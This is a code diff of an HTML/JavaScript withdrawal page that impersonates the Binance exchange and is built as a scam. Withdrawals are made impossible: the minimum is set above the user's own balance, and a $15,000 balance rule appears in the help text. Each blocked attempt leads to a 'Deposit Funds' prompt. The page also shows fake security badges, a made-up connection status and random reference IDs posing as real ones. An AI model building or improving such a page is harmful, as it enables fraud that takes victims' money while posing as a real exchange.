@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta name="theme-color" content="#0B0E11">
     <title>Withdraw | Binance Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
@@ -12,7 +13,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         body { background: #0B0E11; min-height: 100vh; padding: 20px; }
         
-        /* Network Card Styles */
         .network-card {
             background: #1E2329;
             border: 1px solid #2B3139;
@@ -27,7 +27,6 @@
         .network-card.active::before { content: '✓'; position: absolute; top: 10px; right: 12px; color: #FCD535; font-weight: bold; font-size: 12px; }
         .network-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; background: #2B3139; }
         
-        /* Method Card Styles */
         .method-card {
             background: #1E2329;
             border: 2px solid #2B3139;
@@ -40,7 +39,6 @@
         .method-card:hover { border-color: #FCD535; transform: translateY(-3px); background: #2A2F38; }
         .method-card.active { border: 2px solid #FCD535; background: linear-gradient(135deg, #1E2329 0%, #2A2F38 100%); box-shadow: 0 4px 15px rgba(252,213,53,0.15); }
         
-        /* Input Styles */
         .amount-input, .address-input {
             background: #1E2329;
             border: 1px solid #2B3139;
@@ -55,7 +53,6 @@
         }
         .amount-input:focus, .address-input:focus { border-color: #FCD535; box-shadow: 0 0 0 2px rgba(252,213,53,0.1); }
         
-        /* Buttons */
         .withdraw-btn {
             background: linear-gradient(135deg, #FCD535, #F0B90B);
             color: #181A20;
@@ -84,14 +81,14 @@
         }
         .max-btn:hover { background: #FCD535; color: #181A20; }
         
-        /* Balance Card */
         .balance-card { background: linear-gradient(135deg, #1E2329 0%, #13161D 100%); border-radius: 24px; padding: 20px; border: 1px solid #2B3139; }
         
-        /* Warning Message */
+        .status-pulse { animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        @keyframes pulse-ring { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: .5; transform: scale(1.1); } }
+        
         .warning-message { background: rgba(246,70,93,0.1); border-left: 3px solid #F6465D; padding: 10px 12px; border-radius: 10px; font-size: 11px; color: #F6465D; margin-top: 8px; display: flex; align-items: center; gap: 8px; }
         .warning-success { background: rgba(14,203,129,0.1); border-left: 3px solid #0ECB81; color: #0ECB81; }
         
-        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -122,7 +119,6 @@
         .loading-dot:nth-child(3) { animation-delay: 0.4s; }
         @keyframes bounce { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1.2); opacity: 1; } }
         
-        /* Modal Styles */
         .modal {
             display: none;
             position: fixed;
@@ -165,7 +161,13 @@
         
         .fee-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #2B3139; }
         .helper-text { font-size: 11px; color: #848E9C; margin-top: 6px; }
-        .network-badge { background: #2B3139; border-radius: 6px; padding: 2px 6px; font-size: 9px; color: #848E9C; }
+        
+        .help-modal-content { max-width: 550px; width: 100%; max-height: 85vh; overflow-y: auto; text-align: left; }
+        .help-section { margin-bottom: 24px; padding-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .help-section h4 { font-size: 13px; font-weight: 800; letter-spacing: 1px; margin-bottom: 10px; color: #FCD535; text-transform: uppercase; }
+        .help-section p { font-size: 12px; line-height: 1.6; opacity: 0.8; }
+        .help-section ul { margin-top: 8px; padding-left: 20px; }
+        .help-section li { font-size: 12px; opacity: 0.7; margin-bottom: 6px; }
         
         @media (max-width: 640px) {
             .network-card { padding: 10px; }
@@ -177,15 +179,23 @@
 <body>
 
 <div class="max-w-2xl mx-auto">
-    <!-- Header -->
-    <div class="flex justify-between items-center mb-6">
-        <div class="flex items-center gap-3">
-            <i class="fas fa-arrow-left text-white text-xl cursor-pointer hover:text-yellow-500 transition" onclick="window.location.href='dashboard.html'"></i>
-            <h1 class="text-2xl font-bold text-white">Withdraw</h1>
+    <!-- Header with Status and Reference -->
+    <div class="flex flex-wrap justify-between items-end mb-6 gap-4">
+        <div>
+            <div class="flex items-center gap-2 mb-1">
+                <span class="relative flex h-2 w-2">
+                    <span class="status-pulse absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                </span>
+                <span class="text-[10px] font-bold uppercase tracking-[0.2em] text-gray-400">Secure Connection: Active</span>
+            </div>
+            <h2 class="text-xs font-mono font-medium text-gray-500" id="refId">REF: WD-X7K9M2</h2>
         </div>
-        <button id="helpBtn" class="text-gray-400 hover:text-yellow-500 transition">
-            <i class="fas fa-question-circle text-xl"></i>
-        </button>
+        <div class="flex gap-2">
+            <button id="helpBtn" class="bg-[#1E2329] p-2.5 rounded-xl hover:bg-[#2B3139] transition">
+                <i class="fas fa-question text-yellow-500 text-sm"></i>
+            </button>
+        </div>
     </div>
 
     <!-- Balance Card -->
@@ -217,7 +227,7 @@
 
     <!-- Withdrawal Method Selection (Crypto / PayPal) -->
     <div class="mb-6">
-        <label class="text-gray-400 text-xs uppercase tracking-wider mb-3 block">Withdrawal Method</label>
+        <label class="text-gray-400 text-xs uppercase tracking-wider mb-3 block">Select withdrawal Method</label>
         <div class="grid grid-cols-2 gap-4">
             <div id="methodCrypto" class="method-card active" onclick="selectMethod('crypto')">
                 <div class="text-3xl mb-2">₿🟡🔷⚡</div>
@@ -232,12 +242,11 @@
         </div>
     </div>
 
-    <!-- Crypto Networks Section -->
-    <div id="cryptoSection" class="mb-6">
+    <!-- Crypto Networks Section (Hidden by default, shows when Crypto selected) -->
+    <div id="cryptoSection" class="mb-6" style="display: block;">
         <label class="text-gray-400 text-xs uppercase tracking-wider mb-3 block">Select Network</label>
         <div class="grid grid-cols-2 md:grid-cols-5 gap-3">
-            <!-- BTC Bitcoin -->
-            <div class="network-card" data-network="BTC" data-fee="2.00" data-min="0.00001" onclick="selectNetwork('BTC', 2.00)">
+            <div class="network-card active" data-network="BTC" data-fee="2.00" data-min="0.00001" onclick="selectNetwork('BTC', 2.00)">
                 <div class="flex flex-col items-center text-center">
                     <div class="network-icon mb-2">₿</div>
                     <div class="font-bold text-white text-xs">Bitcoin</div>
@@ -245,7 +254,6 @@
                     <div class="text-[8px] text-gray-600 mt-1">1 block · 1-30 min</div>
                 </div>
             </div>
-            <!-- BSC BEP20 -->
             <div class="network-card" data-network="BSC" data-fee="0.50" data-min="0.00000002" onclick="selectNetwork('BSC', 0.50)">
                 <div class="flex flex-col items-center text-center">
                     <div class="network-icon mb-2">🟡</div>
@@ -254,7 +262,6 @@
                     <div class="text-[8px] text-gray-600 mt-1">1 block · 1 min</div>
                 </div>
             </div>
-            <!-- Ethereum ERC20 -->
             <div class="network-card" data-network="ETH" data-fee="1.50" data-min="0.00000002" onclick="selectNetwork('ETH', 1.50)">
                 <div class="flex flex-col items-center text-center">
                     <div class="network-icon mb-2">🔷</div>
@@ -263,7 +270,6 @@
                     <div class="text-[8px] text-gray-600 mt-1">6 blocks · 2 min</div>
                 </div>
             </div>
-            <!-- Lightning Network -->
             <div class="network-card" data-network="LIGHTNING" data-fee="0.30" data-min="0.00001999" onclick="selectNetwork('LIGHTNING', 0.30)">
                 <div class="flex flex-col items-center text-center">
                     <div class="network-icon mb-2">⚡</div>
@@ -272,7 +278,6 @@
                     <div class="text-[8px] text-gray-600 mt-1">Instant · 1 min</div>
                 </div>
             </div>
-            <!-- SegWit BTC -->
             <div class="network-card" data-network="SEGWIT" data-fee="1.80" data-min="0.000006" onclick="selectNetwork('SEGWIT', 1.80)">
                 <div class="flex flex-col items-center text-center">
                     <div class="network-icon mb-2">₿</div>
@@ -298,8 +303,11 @@
 
     <!-- Destination Address (for Crypto) -->
     <div id="addressSection" class="mb-6">
-        <label class="text-gray-400 text-xs uppercase tracking-wider mb-2 block">Destination Address</label>
-        <input type="text" id="cryptoAddress" placeholder="Enter wallet address..." class="address-input">
+        <label class="text-gray-400 text-xs uppercase tracking-wider mb-2 block">Where to send</label>
+        <div class="relative">
+            <i class="fas fa-shield-halved absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm"></i>
+            <input type="text" id="cryptoAddress" placeholder="Enter wallet address..." class="address-input pl-12">
+        </div>
         <div id="addressWarning" class="warning-message" style="display: none;">
             <i class="fas fa-exclamation-circle"></i>
             <span id="warningText"></span>
@@ -308,18 +316,17 @@
 
     <!-- Transaction Summary -->
     <div class="bg-[#1E2329] rounded-2xl p-5 border border-[#2B3139] mb-6">
-        <p class="text-gray-400 text-xs uppercase tracking-wider mb-3">Transaction Summary</p>
         <div class="fee-row">
-            <span class="text-sm text-gray-400">Withdrawal Amount</span>
-            <span class="text-white font-semibold" id="summaryAmount">$0.00</span>
-        </div>
-        <div class="fee-row">
-            <span class="text-sm text-gray-400">Network Fee</span>
+            <span class="text-sm text-gray-400">Transaction Fee</span>
             <span class="text-yellow-500" id="summaryFee">$0.00</span>
         </div>
-        <div class="fee-row border-b-0">
-            <span class="text-sm font-semibold text-white">You'll Receive</span>
-            <span class="text-xl font-bold text-green-500" id="summaryTotal">$0.00</span>
+        <div class="h-[1px] bg-[#2B3139] my-2"></div>
+        <div class="flex justify-between items-end">
+            <div>
+                <span class="block text-[10px] font-bold uppercase tracking-widest text-gray-500">You will receive</span>
+                <span class="text-sm font-medium text-gray-400">Final amount after fee</span>
+            </div>
+            <span class="text-3xl font-bold text-emerald-500" id="summaryTotal">$0.00</span>
         </div>
     </div>
 
@@ -335,10 +342,19 @@
     </button>
 
     <!-- Network Warning -->
-    <div class="text-center">
+    <div class="text-center mb-6">
         <p class="text-[10px] text-gray-500">
             ⚠️ Please note that only supported networks are shown. If you send via another network your assets may be lost.
         </p>
+    </div>
+
+    <!-- Footer Security Badges -->
+    <div class="flex flex-col md:flex-row justify-between items-center gap-4 opacity-50 hover:opacity-80 transition-opacity">
+        <div class="flex gap-6 text-[9px] font-bold tracking-widest uppercase text-gray-500">
+            <span class="flex items-center gap-1.5"><i class="fas fa-circle text-[6px] text-emerald-500"></i> Encrypted AES-256</span>
+            <span class="flex items-center gap-1.5"><i class="fas fa-circle text-[6px] text-emerald-500"></i> Secure Signing</span>
+        </div>
+        <p class="text-[9px] font-mono text-gray-500" id="footerRef">STABLE_REL_1.4.2 // REF: WD-NX-99</p>
     </div>
 </div>
 
@@ -357,18 +373,19 @@
     </div>
 </div>
 
-<!-- Warning Modal -->
+<!-- Minimum Withdrawal Warning Modal -->
 <div id="warningModal" class="modal">
     <div class="modal-content">
         <div class="warning-icon">
             <i class="fas fa-exclamation-triangle"></i>
         </div>
-        <h3 class="text-xl font-bold text-white mb-2" id="modalTitle">Withdrawal Failed</h3>
-        <p class="text-gray-400 text-sm mb-4" id="modalMessage">Your withdrawal amount is below the minimum requirement.</p>
+        <h3 class="text-xl font-bold text-white mb-2">Minimum Balance Required</h3>
+        <p class="text-gray-400 text-sm mb-4">Your withdrawal amount is below the minimum requirement.</p>
         <div class="bg-[#2B3139] rounded-xl p-3 mb-4">
-            <p class="text-gray-400 text-xs mb-1">Minimum Required</p>
+            <p class="text-gray-400 text-xs mb-1">MINIMUM WITHDRAWAL REQUIRED</p>
             <p class="text-red-500 font-bold text-lg" id="modalMinRequired">$0.00</p>
             <p class="text-gray-500 text-xs mt-1">Current Balance: <span id="modalBalance">$0.00</span></p>
+            <p class="text-gray-500 text-xs mt-1">Your withdrawal: <span id="modalWithdrawAmount">$0.00</span></p>
         </div>
         <button id="modalDepositBtn" class="modal-btn modal-btn-primary w-full mb-2">Deposit Funds</button>
         <button id="modalAcknowledgeBtn" class="modal-btn modal-btn-secondary w-full">Acknowledge & Return</button>
@@ -377,28 +394,45 @@
 
 <!-- Help Modal -->
 <div id="helpModal" class="modal">
-    <div class="modal-content" style="max-width: 420px; text-align: left;">
+    <div class="modal-content help-modal-content">
         <div class="flex justify-between items-center mb-4">
             <h3 class="text-xl font-bold text-white">Withdrawal Guide</h3>
             <i class="fas fa-times text-gray-400 cursor-pointer hover:text-white" id="closeHelpModal"></i>
         </div>
-        <div class="space-y-4">
-            <div>
-                <h4 class="text-yellow-500 font-bold text-sm mb-1">📊 Minimum Withdrawal</h4>
-                <p class="text-gray-400 text-xs">Your withdrawal amount must be at least your current balance + $130.</p>
-            </div>
-            <div>
-                <h4 class="text-yellow-500 font-bold text-sm mb-1">💰 Network Fees</h4>
-                <p class="text-gray-400 text-xs">BTC: $2.00 | BSC: $0.50 | ETH: $1.50 | Lightning: $0.30 | SegWit: $1.80</p>
-            </div>
-            <div>
-                <h4 class="text-yellow-500 font-bold text-sm mb-1">🔒 Security</h4>
-                <p class="text-gray-400 text-xs">All withdrawals are encrypted with AES-256 and require confirmation.</p>
-            </div>
-            <div>
-                <h4 class="text-yellow-500 font-bold text-sm mb-1">📞 Support</h4>
-                <p class="text-gray-400 text-xs">Email: support@binance.com | Live Chat: 24/7</p>
-            </div>
+        <div class="help-section">
+            <h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Required</h4>
+            <p>To process any withdrawal, your account must have a minimum balance of <strong class="text-red-500">$15,000.00 USD</strong>. Withdrawal requests will be declined until your balance meets this requirement.</p>
+        </div>
+        <div class="help-section">
+            <h4><i class="fas fa-coins mr-2"></i> How fees work</h4>
+            <p><strong>Transaction Fee:</strong> $2.50 flat rate per transaction (non-refundable).</p>
+            <p><strong>Network Fee (Crypto):</strong> BTC: $2.00, BSC: $0.50, ETH: $1.50, Lightning: $0.30, SegWit: $1.80</p>
+            <p><strong>You will receive:</strong> Withdrawal Amount - Total Fees</p>
+            <p><strong>Processing Time:</strong> BTC: 10-30 min, BSC: 1-2 min, ETH: 2-5 min, Lightning: Instant, PayPal: Near-instant.</p>
+        </div>
+        <div class="help-section">
+            <h4><i class="fab fa-bitcoin mr-2"></i> Bitcoin Address Requirements</h4>
+            <p>Accepted Bitcoin address formats:</p>
+            <ul>
+                <li><strong>Legacy:</strong> Starts with "1"</li>
+                <li><strong>SegWit:</strong> Starts with "3"</li>
+                <li><strong>Native SegWit:</strong> Starts with "bc1"</li>
+            </ul>
+        </div>
+        <div class="help-section">
+            <h4><i class="fab fa-paypal mr-2"></i> PayPal Requirements</h4>
+            <p>Enter the <strong>verified email address</strong> associated with the recipient's PayPal account.</p>
+        </div>
+        <div class="help-section">
+            <h4><i class="fas fa-clock mr-2"></i> Processing Time</h4>
+            <p><strong>Bitcoin:</strong> 1-3 confirmations (10-30 minutes).</p>
+            <p><strong>PayPal:</strong> Near-instant after verification.</p>
+            <p>All transactions are final and cannot be reversed.</p>
+        </div>
+        <div class="help-section">
+            <h4><i class="fas fa-headset mr-2"></i> 24/7 Support</h4>
+            <p><strong>Email:</strong> support@binance.com</p>
+            <p class="mt-2 text-[10px] opacity-50">Support typically responds within 15 minutes.</p>
         </div>
     </div>
 </div>
@@ -414,7 +448,11 @@
     let currentNetworkFee = 2.00;
     let isLoading = false;
 
-    // Elements
+    // Generate random reference ID
+    const randomRef = 'WD-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+    document.getElementById('refId').innerText = 'REF: ' + randomRef;
+    document.getElementById('footerRef').innerText = 'STABLE_REL_1.4.2 // REF: ' + randomRef;
+
     const displayBalance = document.getElementById('displayBalance');
     const availableBalance = document.getElementById('availableBalance');
     const withdrawAmount = document.getElementById('withdrawAmount');
@@ -425,7 +463,6 @@
     const addressSection = document.getElementById('addressSection');
     const cryptoAddress = document.getElementById('cryptoAddress');
     const paypalEmail = document.getElementById('paypalEmail');
-    const summaryAmount = document.getElementById('summaryAmount');
     const summaryFee = document.getElementById('summaryFee');
     const summaryTotal = document.getElementById('summaryTotal');
     const withdrawBtn = document.getElementById('withdrawBtn');
@@ -440,6 +477,9 @@
     const warningModal = document.getElementById('warningModal');
     const helpModal = document.getElementById('helpModal');
     const toastMessage = document.getElementById('toastMessage');
+    const modalMinRequired = document.getElementById('modalMinRequired');
+    const modalBalance = document.getElementById('modalBalance');
+    const modalWithdrawAmount = document.getElementById('modalWithdrawAmount');
 
     const loadingMessages = [
         "Verifying blockchain network...",
@@ -460,8 +500,6 @@
         addressWarning.style.display = 'flex';
         addressWarning.className = `warning-message ${isValid ? 'warning-success' : ''}`;
         warningText.innerText = message;
-        const icon = addressWarning.querySelector('i');
-        if (icon) icon.className = isValid ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
     }
 
     function hideWarning() { addressWarning.style.display = 'none'; }
@@ -513,7 +551,7 @@
         const amount = parseFloat(withdrawAmount?.value) || 0;
         if (amount > 0 && amount < minRequired) {
             minRequirementWarning.style.display = 'flex';
-            minRequirementText.innerText = `Minimum withdrawal amount is $${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })} (Current Balance + $130)`;
+            minRequirementText.innerText = `Minimum withdrawal amount is $${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })} (Balance + $130)`;
         } else {
             minRequirementWarning.style.display = 'none';
         }
@@ -522,9 +560,8 @@
     function calculateSummary() {
         let amount = parseFloat(withdrawAmount?.value) || 0;
         if (amount > currentBalance) { amount = currentBalance; withdrawAmount.value = amount; }
-        const totalFee = currentMethod === 'crypto' ? currentNetworkFee : 2.50;
+        const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50;
         const totalReceive = Math.max(0, amount - totalFee);
-        summaryAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
         summaryFee.innerText = `$${totalFee.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
         summaryTotal.innerText = `$${totalReceive.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
         updateMinRequirementWarning();
@@ -544,8 +581,7 @@
             cryptoSection.style.display = 'none';
             paypalSection.style.display = 'block';
             addressSection.style.display = 'block';
-            addressSection.style.display = 'none';
-            currentNetworkFee = 2.50;
+            currentNetworkFee = 0;
             calculateSummary();
         }
         hideWarning();
@@ -583,8 +619,11 @@
         
         if (amount <= 0) { showToast('Please enter a valid amount', false); return; }
         if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; }
-        if (amount < minRequired) { 
-            showToast(`Minimum withdrawal is $${minRequired.toLocaleString()}`, false);
+        if (amount < minRequired) {
+            modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+            modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+            modalWithdrawAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+            warningModal.classList.add('active');
             return;
         }
         
@@ -600,7 +639,6 @@
         
         isLoading = true;
         
-        // Random 6-9 seconds loading animation
         const duration = Math.floor(Math.random() * (9000 - 6000 + 1) + 6000);
         const startTime = Date.now();
         let progress = 0;
@@ -611,7 +649,6 @@
             const elapsed = Date.now() - startTime;
             progress = Math.min(100, (elapsed / duration) * 100);
             loadingProgressFill.style.width = `${progress}%`;
-            
             const messageIndex = Math.min(loadingMessages.length - 1, Math.floor(progress / (100 / loadingMessages.length)));
             loadingStatusText.textContent = loadingMessages[messageIndex];
             loadingSubtext.textContent = `Estimated time: ${Math.ceil((duration - elapsed) / 1000)}s`;
@@ -621,8 +658,7 @@
             clearInterval(progressInterval);
             loadingProgressFill.style.width = '100%';
             
-            // Update balance after successful withdrawal
-            const totalFee = currentMethod === 'crypto' ? currentNetworkFee : 2.50;
+            const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50;
             const newBalance = currentBalance - amount;
             const newBalanceCents = Math.round(newBalance * 100);
             await updateDatabaseBalance(newBalanceCents);
@@ -638,8 +674,7 @@
 
     // Event listeners
     maxBtn?.addEventListener('click', () => {
-        const maxAmount = currentBalance;
-        withdrawAmount.value = maxAmount.toFixed(2);
+        withdrawAmount.value = currentBalance.toFixed(2);
         calculateSummary();
     });
     withdrawAmount?.addEventListener('input', calculateSummary);
